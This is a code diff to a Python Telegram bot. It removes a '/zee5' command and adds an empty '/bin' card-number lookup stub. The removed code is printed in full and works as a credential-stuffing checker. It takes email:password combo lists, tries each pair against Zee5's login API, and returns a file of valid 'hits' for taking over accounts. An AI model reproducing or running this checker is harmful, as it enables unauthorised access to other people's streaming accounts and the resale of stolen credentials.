@@ -66,88 +66,13 @@ async def _(event):
  await event.reply(text, parse_mode="html")
 
  
-@Cbot(pattern="^/zee5 ?(.*)")
-async def zee(event):
-    input_str = event.pattern_match.group(1)
-    if input_str == "combo":
-        ok = await event.reply(
-            "`Checking Your Combos File. This May Take Time Depending On No of Combos.`"
-        )
-        stark_dict = []
-        hits_dict = []
-        hits = 0
-        bads = 0
-        lol = await event.get_reply_message()
-        if lol == None:
-            await ok.edit('Reply To File')
-            return
-        starky = await tbot.download_media(lol.media, './')
-        with open(starky) as f:
-            stark_dict = f.read().splitlines()
-        if len(stark_dict) > 1000:
-            await ok.edit("`Woah, Thats A Lot Of Combos. Keep 1000 As Limit`")
-            return
-        os.remove(starky)
-        for i in stark_dict:
-            starkm = i.split(":")
-            email = starkm[0]
-            password = starkm[1]
-            try:
-                meke = requests.get(
-                    f"https://userapi.zee5.com/v1/user/loginemail?email={email}&password={password}"
-                ).json()
-            except BaseException:
-                meke = None
-            if meke.get("token"):
-                hits += 1
-                hits_dict.append(f"{email}:{password}")
-            else:
-                bads += 1
-        if len(hits_dict) == 0:
-            await ok.edit("**0 Hits. Probably, You Should Find Better Combos. LoL**")
-            return
-        with open("hits.txt", "w") as hitfile:
-            for s in hits_dict:
-                hitfile.write(s + " | @DevsExpo")
-        ok.delete()
-        await tbot.send_file(
-            event.chat_id,
-            "hits.txt",
-            caption=f"**!ZEE5 HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bads}`",
-        )
-        os.remove("hits.txt")
-    else:
-        if input_str:
-            if ":" in input_str:
-                stark = input_str.split(":", 1)
-            else:
-                await event.reply("**! No Lol, use email:pass Regex !**")
-                return
-        else:
-            await event.reply("**Give Combos To Check**")
-            return
-        email = stark[0]
-        password = stark[1]
-        meke = requests.get(
-            f"https://userapi.zee5.com/v1/user/loginemail?email={email}&password={password}"
-        ).json()
-        beautifuln = f"""
-💖 **Checked Zee5 Account**
-**Combo:** {email}:{password}
-**Email:** {email}
-**Password:-** {password}
-**Response:-** This Account Is Invalid. 😔
-🔱 **Checked By:-** {event.sender_id}"""
-
-        beautiful = f"""
-💖 **Checked Zee5 Account**
-**Combo:** {email}:{password}
-**Email:** {email}
-**Password:-** {password}
-**Response:-** This Account Is valid.😀
-**Login Here**: www.zee5.com
-🔱 **Checked By:-** {event.sender_id}"""
-        if meke.get("token"):
-            await event.reply(beautiful)
-        else:
-            await event.reply(beautifuln)
+@Cbot(pattern="^/bin ?(.*)")
+async def bin(event):
+ if event.reply_to_msg_id:
+   msg = await event.get_reply_message()
+   bin = msg.text
+ elif event.pattern_match.group(1):
+   bin = event.pattern_match.group(1)
+ else:
+   return await event.reply("Enter the bin to get info.")
+ #Soon
